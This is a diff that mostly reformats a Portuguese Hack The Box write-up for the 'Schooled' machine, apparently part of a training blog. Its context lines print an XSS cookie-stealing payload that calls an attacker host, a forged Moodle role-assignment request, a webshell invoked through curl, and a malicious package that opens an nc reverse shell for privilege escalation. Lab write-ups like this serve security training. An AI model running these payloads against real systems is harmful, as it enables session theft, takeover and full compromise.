@@ -19,8 +19,9 @@ Olá pessoal!
 
 A máquina desta semana será **Schooled**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [TheCyberGeek](https://app.hackthebox.eu/users/114053).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
+</Alert>
 
 ![HTB Schooled](https://i.imgur.com/qw8zycI.png)
 
@@ -59,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
 Em paralelo, iniciei outro scan, para validar todas as portas TCP abertas, onde encontrei também a porta 33060/TCP, resultando no output final dos seguintes serviços:
 
 ```bash
-$ nmap -p 80,33060 -A -oA Full 10.10.10.234                                                                                     
+$ nmap -p 80,33060 -A -oA Full 10.10.10.234
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:57 -03
 Nmap scan report for schooled.htb (10.10.10.234)
 Host is up (0.077s latency).
@@ -207,13 +208,13 @@ Buscando por **MoodleNet XSS**, encontrei este [Security Announcement](https://m
 
 Buscando por uma prova de conceito (PoC) para este CVE, encontrei o repositório [HoangKien1020/CVE-2020-25627: Stored XSS via moodlenetprofile parameter in user profile (github.com)](https://github.com/HoangKien1020/CVE-2020-25627) que contém as instruções para exploração, que foram implementadas e me permitiram obter o cookie da sessão do professor, conforme evidencia abaixo:
 
-* Loguei com a conta recentemente criada e modifiquei o MoodleNet profile para o conteúdo abaixo
+- Loguei com a conta recentemente criada e modifiquei o MoodleNet profile para o conteúdo abaixo
 
 ```html
 <script>var i=new Image;i.src="http://10.10.10.10/xss.php?"+document.cookie;</script>
 ```
 
-* Hospedei o arquivo `xss.php` mencionado no repositório em uma pasta e iniciei um PHP Webserver com os comandos abaixo e, cerca de 2 minutos depois, comecei a receber as requisições da conta do professor, nos mostrando os cookies utilizados por ele.
+- Hospedei o arquivo `xss.php` mencionado no repositório em uma pasta e iniciei um PHP Webserver com os comandos abaixo e, cerca de 2 minutos depois, comecei a receber as requisições da conta do professor, nos mostrando os cookies utilizados por ele.
 
 ```bash
 $ sudo php -S 0.0.0.0:80 -t .
@@ -232,13 +233,13 @@ Agora sabendo quais os parametros da sessão do professor, alterei o valor do co
 
 Agora que temos acesso a outra conta, necessitamos validar se as permissões possuidas por este usuário são suficientes para dar continuidade na exploração, vindo a obter um RCE.
 
-Pesquisando sobre explorações em Moodle em [Moodle - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/moodle#rce), encontrei qeu é necessário o privilégio de *manager* para realizar o upload de um plugin, método mais eficiente para obter execução de código via aplicação. Mesmo não tendo esta permissão com o usuário do professor, observado que esta versão em execução **também é vulnerável à** **[Escalação de privilégio](https://moodle.org/mod/forum/discuss.php?d=407393)**, que poderia nos permitir obter o acesso de manager a partir do curso abusando o processo de inscrição e, se um dos estudantes for um dos *site managers*, este privilégio poderia ser explorado para a finalidade desejada, que é realizar o upload de um plugin malicioso. O mesmo autor da PoC do outro CVE também possui [um repositório no Github](https://github.com/HoangKien1020/CVE-2020-14321) contendo uma PoC que poderia nos auxiliar nesta tarefa.
+Pesquisando sobre explorações em Moodle em [Moodle - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/moodle#rce), encontrei qeu é necessário o privilégio de _manager_ para realizar o upload de um plugin, método mais eficiente para obter execução de código via aplicação. Mesmo não tendo esta permissão com o usuário do professor, observado que esta versão em execução **também é vulnerável à** **[Escalação de privilégio](https://moodle.org/mod/forum/discuss.php?d=407393)**, que poderia nos permitir obter o acesso de manager a partir do curso abusando o processo de inscrição e, se um dos estudantes for um dos _site managers_, este privilégio poderia ser explorado para a finalidade desejada, que é realizar o upload de um plugin malicioso. O mesmo autor da PoC do outro CVE também possui [um repositório no Github](https://github.com/HoangKien1020/CVE-2020-14321) contendo uma PoC que poderia nos auxiliar nesta tarefa.
 
 Mesmo não funcionando adequadamente a PoC em nosso cenário, após entender exatamente os passos necessários, foi possível obter execução de código na máquina, conforme passos abaixo:
 
-* Primeiro foi necessário identificar qual usuário na plataforma poderia ter o privilégio de manager. Com base nas informações obtidas a partire de reconhecimento do site institucional, **Lianne Carter** é a gerente da escola e provavelmente possui os privilégios dos quais precisamos.
-* Também tomei nota sobre o Profile ID do usuário **Manuel Philips**, que foi obtido ao navegar à sua página no link  `http://moodle.schooled.htb/moodle/user/profile.php?id=24`.
-* A exploração iniciou-se por fazer a inscrição da gerente da escola na turma de matemática e, interceptando a requisição utilizando o Burp Suite, enviei a mesma ao Repeater e, além da requisição inicial, fiz uma nova para nos conceder o priviégio de Manager no curso, por atribuir o valor `roleid=1` e substituir o ID do usuário pelo identificado previamente, conforme visto no video no repositório.
+- Primeiro foi necessário identificar qual usuário na plataforma poderia ter o privilégio de manager. Com base nas informações obtidas a partire de reconhecimento do site institucional, **Lianne Carter** é a gerente da escola e provavelmente possui os privilégios dos quais precisamos.
+- Também tomei nota sobre o Profile ID do usuário **Manuel Philips**, que foi obtido ao navegar à sua página no link `http://moodle.schooled.htb/moodle/user/profile.php?id=24`.
+- A exploração iniciou-se por fazer a inscrição da gerente da escola na turma de matemática e, interceptando a requisição utilizando o Burp Suite, enviei a mesma ao Repeater e, além da requisição inicial, fiz uma nova para nos conceder o priviégio de Manager no curso, por atribuir o valor `roleid=1` e substituir o ID do usuário pelo identificado previamente, conforme visto no video no repositório.
 
 ```http
 GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KbJYqTapFc&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=24&roletoassign=1&startdate=4&duration= HTTP/1.1
@@ -254,18 +255,21 @@ Cookie: MoodleSession=jil2s8i0vj0gq3vojfki6e7rtq
 Connection: close
 ```
 
-* Agora como um Administrador do curso, acessando um perfil de usuário podemos utilizar a função "Log in as", que nos permitiu acessar a plataforma como o usuário Lianne Carter.
+- Agora como um Administrador do curso, acessando um perfil de usuário podemos utilizar a função "Log in as", que nos permitiu acessar a plataforma como o usuário Lianne Carter.
 
-  ![HTB Schooled - Impersonating Manager in Moodle](https://i.imgur.com/zRjimbq.png)
-* Agora como Lianne, deveríamos ter privilégios de realizar o upload do plugin diretamente, uma vez que a opção "Site Administration" é exibida à esquerda, porém tais privilégios não são habilitados por padrão. Para tal atividade, precisamos editar a role acessando o menu "Site Administration" > "Users" e, na aba "Permissions", selecionei "Define Roles".
+![HTB Schooled - Impersonating Manager in Moodle](https://i.imgur.com/zRjimbq.png)
 
-  ![HTB Schooled - Adjusting Role Definitions](https://i.imgur.com/6XmydvH.png)
-* Selecionei a role **Manager** e, clicando no botão "Edit", interceptei a requisição e substitui o dado enviado pelo encontrado no repositório, qeu me concederia privilégios totais na aplicação.
+- Agora como Lianne, deveríamos ter privilégios de realizar o upload do plugin diretamente, uma vez que a opção "Site Administration" é exibida à esquerda, porém tais privilégios não são habilitados por padrão. Para tal atividade, precisamos editar a role acessando o menu "Site Administration" > "Users" e, na aba "Permissions", selecionei "Define Roles".
 
-  ![HTB Schooled - Modifying Manager role](https://i.imgur.com/lm0NOX7.png)
+![HTB Schooled - Adjusting Role Definitions](https://i.imgur.com/6XmydvH.png)
 
-  ![HTB Schooled - Appending payload to Edit Request](https://i.imgur.com/5L28UqN.png)
-* Agora, navegando em "Site Administration" > "Plugins" podemos ver a opção para instalação, para o qual o arquivo `rce.zip`, também disponibilizado no portal, foi carregado, nos permitindo executar comandos remotamente e obter um shell reverso a partir de chamadas na URL do plugin, conforme abaixo:
+- Selecionei a role **Manager** e, clicando no botão "Edit", interceptei a requisição e substitui o dado enviado pelo encontrado no repositório, qeu me concederia privilégios totais na aplicação.
+
+![HTB Schooled - Modifying Manager role](https://i.imgur.com/lm0NOX7.png)
+
+![HTB Schooled - Appending payload to Edit Request](https://i.imgur.com/5L28UqN.png)
+
+- Agora, navegando em "Site Administration" > "Plugins" podemos ver a opção para instalação, para o qual o arquivo `rce.zip`, também disponibilizado no portal, foi carregado, nos permitindo executar comandos remotamente e obter um shell reverso a partir de chamadas na URL do plugin, conforme abaixo:
 
 ```bash
 $ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=id'
@@ -291,7 +295,7 @@ echo "?>" >> wget.php
 
 A partir da execução, a seguintes informações foram obtidas:
 
-* Usuários com console e suas permissões:
+- Usuários com console e suas permissões:
 
 ```plaintext
 jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
@@ -299,7 +303,7 @@ root:*:0:0:Charlie &:/root:/bin/csh
 steve:*:1002:1002:User &:/home/steve:/bin/csh
 ```
 
-* Senha para o banco de dados do Moodle no arquivo `/usr/local/www/apache24/data/moodle/config.php` :
+- Senha para o banco de dados do Moodle no arquivo `/usr/local/www/apache24/data/moodle/config.php` :
 
 ```plaintext
 $CFG->dbtype    = 'mysqli';
@@ -371,14 +375,14 @@ User jamie may run the following commands on Schooled:
 
 Verificando a página do binário `pkg` no [GTFOBins](https://gtfobins.github.io/gtfobins/pkg/) descobri que poderia utilizá-lo para instalar um pacote malicioso, de modo a conseguir um shell reverso nesta máquina. Os passos abaixo foram executados para obter um shell como `root`
 
-* Instalei o pacote `fpm` na máquina atacante, também disponivel a partir deste [repositório no Github](https://github.com/jordansissel/fpm)
+- Instalei o pacote `fpm` na máquina atacante, também disponivel a partir deste [repositório no Github](https://github.com/jordansissel/fpm)
 
 ```bash
 sudo apt-get install ruby ruby-dev rubygems build-essential
 sudo gem install --no-document fpm
 ```
 
-* Criei um pacote contendo o payload malicioso, no caso destinado a executar o comando para obtenção de um shell reverso
+- Criei um pacote contendo o payload malicioso, no caso destinado a executar o comando para obtenção de um shell reverso
 
 ```bash
 TF=$(mktemp -d)
@@ -387,7 +391,7 @@ echo 'rm $file;mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >$file
 fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
 ```
 
-* Transferi o pacote para a máquina alvo e executei o comando `sudo` permitido, obtendo assim um shell reverso a partir da conta do `jamie`, podendo assim ler a flag de root
+- Transferi o pacote para a máquina alvo e executei o comando `sudo` permitido, obtendo assim um shell reverso a partir da conta do `jamie`, podendo assim ler a flag de root
 
 ```bash
 jamie@Schooled:/tmp $ /usr/local/bin/curl http://10.10.10.10/x-1.0.txz -o x-1.0.txz
